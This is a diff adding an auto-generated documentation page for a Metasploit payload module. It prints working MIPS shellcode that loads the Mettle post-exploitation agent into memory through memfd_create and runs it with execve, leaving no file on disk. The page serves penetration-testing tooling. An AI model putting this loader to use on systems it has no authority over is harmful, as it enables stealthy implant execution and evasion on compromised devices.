@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>
+  Module: Msf::Payload::Linux::Mipsle::ElfLoader
+  
+    &mdash; Documentation by YARD 0.9.37
+  
+</title>
+
+  <link rel="stylesheet" href="../../../../css/style.css" type="text/css" />
+
+  <link rel="stylesheet" href="../../../../css/common.css" type="text/css" />
+
+<script type="text/javascript">
+  pathId = "Msf::Payload::Linux::Mipsle::ElfLoader";
+  relpath = '../../../../';
+</script>
+
+
+  <script type="text/javascript" charset="utf-8" src="../../../../js/jquery.js"></script>
+
+  <script type="text/javascript" charset="utf-8" src="../../../../js/app.js"></script>
+
+
+  </head>
+  <body>
+    <div class="nav_wrap">
+      <iframe id="nav" src="../../../../class_list.html?1"></iframe>
+      <div id="resizer"></div>
+    </div>
+
+    <div id="main" tabindex="-1">
+      <div id="header">
+        <div id="menu">
+  
+    <a href="../../../../_index.html">Index (E)</a> &raquo;
+    <span class='title'><span class='object_link'><a href="../../../../Msf.html" title="Msf (module)">Msf</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../../Payload.html" title="Msf::Payload (class)">Payload</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../Linux.html" title="Msf::Payload::Linux (module)">Linux</a></span></span> &raquo; <span class='title'>Mipsle</span>
+     &raquo; 
+    <span class="title">ElfLoader</span>
+  
+</div>
+
+        <div id="search">
+  
+    <a class="full_list_link" id="class_list_link"
+        href="../../../../class_list.html">
+
+        <svg width="24" height="24">
+          <rect x="0" y="4" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="12" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="20" width="24" height="4" rx="1" ry="1"></rect>
+        </svg>
+    </a>
+  
+</div>
+        <div class="clear"></div>
+      </div>
+
+      <div id="content"><h1>Module: Msf::Payload::Linux::Mipsle::ElfLoader
+  
+  
+  
+</h1>
+<div class="box_info">
+  
+
+  
+  
+  
+  
+  
+
+  
+
+  
+  <dl>
+    <dt>Defined in:</dt>
+    <dd>lib/msf/core/payload/linux/mipsle/elf_loader.rb</dd>
+  </dl>
+  
+</div>
+
+<h2>Overview</h2><div class="docstring">
+  <div class="discussion">
+    
+<p>In memory loader used to execute Mettle ELF file. Compatible with Kernel Linux &gt;= 3.17 (where memfd_create is introduced) Author: Diego Ledda &lt;<a href="at">diego_ledda</a>rapid7.com&gt; Resource and Credits: <a href="https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html">magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html</a> MIPS conventions</p>
+
+<pre class="code ruby"><code class="ruby">Literal Zero: r0/$zero
+Volatile: t0-t7
+Parameters: a0-a3
+Syscall offset: v0
+Return Address: ra
+</code></pre>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div>
+
+
+
+
+
+
+  
+    <h2>
+      Instance Method Summary
+      <small><a href="#" class="summary_toggle">collapse</a></small>
+    </h2>
+
+    <ul class="summary">
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#in_memory_load-instance_method" title="#in_memory_load (instance method)">#<strong>in_memory_load</strong>(payload)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+    </ul>
+  
+
+
+
+  <div id="instance_method_details" class="method_details_list">
+    <h2>Instance Method Details</h2>
+
+    
+      <div class="method_details first">
+  <h3 class="signature first" id="in_memory_load-instance_method">
+  
+    #<strong>in_memory_load</strong>(payload)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/linux/mipsle/elf_loader.rb', line 14</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_in_memory_load'>in_memory_load</span><span class='lparen'>(</span><span class='id identifier rubyid_payload'>payload</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_size'>size</span> <span class='op'>=</span> <span class='id identifier rubyid_payload'>payload</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span>
+  <span class='id identifier rubyid_size_h'>size_h</span> <span class='op'>=</span> <span class='id identifier rubyid_size'>size</span> <span class='op'>&gt;&gt;</span> <span class='int'>16</span>
+  <span class='id identifier rubyid_size_l'>size_l</span> <span class='op'>=</span> <span class='id identifier rubyid_size'>size</span> <span class='op'>&amp;</span> <span class='int'>0x0000ffff</span>
+  <span class='id identifier rubyid_in_memory_loader'>in_memory_loader</span> <span class='op'>=</span> <span class='lbracket'>[</span>
+    <span class='comment'># call next instruction to get relative address
+</span>    <span class='int'>0x00001025</span><span class='comma'>,</span>              <span class='comment'>#   move    v0,zero                       
+</span>    <span class='int'>0x04510000</span><span class='comma'>,</span>              <span class='comment'>#   bgezal  v0,4100f8 &lt;myself&gt;
+</span>    <span class='comment'># memfd_create(&quot;&quot;, MFD_CLOEXEC) = fd
+</span>    <span class='int'>0x27ff005c</span><span class='comma'>,</span>              <span class='comment'>#   addiu   ra,ra,0x5c
+</span>    <span class='int'>0xafa0fffc</span><span class='comma'>,</span>              <span class='comment'>#   sw      zero,-4(sp)
+</span>    <span class='int'>0x27bdfffc</span><span class='comma'>,</span>              <span class='comment'>#   addiu   sp,sp,-4
+</span>    <span class='int'>0x03a02020</span><span class='comma'>,</span>              <span class='comment'>#   add     a0,sp,zero
+</span>    <span class='int'>0x2419fffe</span><span class='comma'>,</span>              <span class='comment'>#   li      t9,-2
+</span>    <span class='int'>0x03202827</span><span class='comma'>,</span>              <span class='comment'>#   nor     a1,t9,zero
+</span>    <span class='int'>0x34021102</span><span class='comma'>,</span>              <span class='comment'>#   li      v0,0x1102
+</span>    <span class='int'>0x0101010c</span><span class='comma'>,</span>              <span class='comment'>#   syscall 0x40404
+</span>    <span class='comment'># write(fd, payload, payload_length)
+</span>    <span class='int'>0x03e02825</span><span class='comma'>,</span>              <span class='comment'>#   move    a1,ra
+</span>    <span class='lparen'>(</span><span class='int'>0x3c06</span> <span class='op'>&lt;&lt;</span> <span class='int'>16</span> <span class='op'>|</span> <span class='id identifier rubyid_size_h'>size_h</span><span class='rparen'>)</span><span class='comma'>,</span> <span class='comment'>#   lui     a2,0x17
+</span>    <span class='lparen'>(</span><span class='int'>0x34c6</span> <span class='op'>&lt;&lt;</span> <span class='int'>16</span> <span class='op'>|</span> <span class='id identifier rubyid_size_l'>size_l</span><span class='rparen'>)</span><span class='comma'>,</span> <span class='comment'>#   ori     a2,a2,0x2fb8
+</span>    <span class='int'>0x00402025</span><span class='comma'>,</span>              <span class='comment'>#   move    a0,v0
+</span>    <span class='int'>0x0080c825</span><span class='comma'>,</span>              <span class='comment'>#   move    t9,a0
+</span>    <span class='int'>0x34020fa4</span><span class='comma'>,</span>              <span class='comment'>#   li      v0,0xfa4
+</span>    <span class='int'>0x0101010c</span><span class='comma'>,</span>              <span class='comment'>#   syscall 0x40404
+</span>    <span class='comment'># custom implementation of itoa
+</span>    <span class='int'>0x27e7fffe</span><span class='comma'>,</span>              <span class='comment'>#   addiu   a3,ra,-2
+</span>    <span class='int'>0x240e000a</span><span class='comma'>,</span>              <span class='comment'>#   li      t6,10
+</span>    <span class='int'>0x24050016</span><span class='comma'>,</span>              <span class='comment'>#   li      a1,22
+</span>    <span class='int'>0x13200011</span><span class='comma'>,</span>              <span class='comment'>#   beqz    t9,410188 &lt;execve&gt;
+</span>    <span class='int'>0x00000000</span><span class='comma'>,</span>              <span class='comment'>#   bnez    t6,410150 &lt;itoa+0x10&gt;
+</span>    <span class='int'>0x032e001a</span><span class='comma'>,</span>              <span class='comment'>#   div     zero,t9,t6
+</span>    <span class='int'>0x00000000</span><span class='comma'>,</span>              <span class='comment'>#   break   0x7
+</span>    <span class='int'>0x2401ffff</span><span class='comma'>,</span>              <span class='comment'>#   li      at,-1
+</span>    <span class='int'>0x15c10004</span><span class='comma'>,</span>              <span class='comment'>#   bne     t6,at,410168 &lt;itoa+0x28&gt;
+</span>    <span class='int'>0x3c018000</span><span class='comma'>,</span>              <span class='comment'>#   lui     at,0x8000
+</span>    <span class='int'>0x17210002</span><span class='comma'>,</span>              <span class='comment'>#   bne     t9,at,410168 &lt;itoa+0x28&gt;
+</span>    <span class='int'>0x00000000</span><span class='comma'>,</span>              <span class='comment'>#   nop
+</span>    <span class='int'>0x00000000</span><span class='comma'>,</span>              <span class='comment'>#   break   0x6
+</span>    <span class='int'>0x0000c812</span><span class='comma'>,</span>              <span class='comment'>#   mflo    t9
+</span>    <span class='int'>0x0000c812</span><span class='comma'>,</span>              <span class='comment'>#   mflo    t9
+</span>    <span class='int'>0x00005810</span><span class='comma'>,</span>              <span class='comment'>#   mfhi    t3
+</span>    <span class='int'>0x256b0030</span><span class='comma'>,</span>              <span class='comment'>#   addiu   t3,t3,48
+</span>    <span class='int'>0xa0eb0000</span><span class='comma'>,</span>              <span class='comment'>#   sb      t3,0(a3)
+</span>    <span class='int'>0x24a5ffff</span><span class='comma'>,</span>              <span class='comment'>#   addiu   a1,a1,-1
+</span>    <span class='int'>0x24e7ffff</span><span class='comma'>,</span>              <span class='comment'>#   addiu   a3,a3,-1
+</span>    <span class='int'>0x1000ffee</span><span class='comma'>,</span>              <span class='comment'>#   b       410140 &lt;itoa&gt;
+</span>    <span class='int'>0x00e52022</span><span class='comma'>,</span>              <span class='comment'>#   sub     a0,a3,a1
+</span>    <span class='int'>0x2805ffff</span><span class='comma'>,</span>              <span class='comment'>#   slti    a1,zero,-1
+</span>    <span class='int'>0x2806ffff</span><span class='comma'>,</span>              <span class='comment'>#   slti    a2,zero,-1
+</span>    <span class='int'>0x34020fab</span><span class='comma'>,</span>              <span class='comment'>#   li      v0,0xfab
+</span>    <span class='comment'># execve(&#39;/proc/self/fd//////&lt;fd&gt;&#39;, 0, 0)
+</span>    <span class='int'>0x0101010c</span><span class='comma'>,</span>              <span class='comment'>#   syscall 0x40404
+</span>    <span class='int'>0x6f72702f</span><span class='comma'>,</span>              <span class='comment'>#   .word   0x6f72702f
+</span>    <span class='int'>0x65732f63</span><span class='comma'>,</span>              <span class='comment'>#   .word   0x65732f63
+</span>    <span class='int'>0x662f666c</span><span class='comma'>,</span>              <span class='comment'>#   .word   0x662f666c
+</span>    <span class='int'>0x2f2f2f64</span><span class='comma'>,</span>              <span class='comment'>#   sltiu   t7,t9,12132
+</span>    <span class='int'>0x2f2f2f2f</span><span class='comma'>,</span>              <span class='comment'>#   sltiu   t7,t9,12079
+</span>    <span class='int'>0x002f2f2f</span>               <span class='comment'>#   .word   0x2f2f2f
+</span>  <span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>V*</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_in_memory_loader'>in_memory_loader</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+  </div>
+
+</div>
+
+      <div id="footer">
+  Generated on Thu Jan 29 04:40:59 2026 by
+  <a href="https://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
+  0.9.37 (ruby-3.1.5).
+</div>
+
+    </div>
+  </body>
+</html>
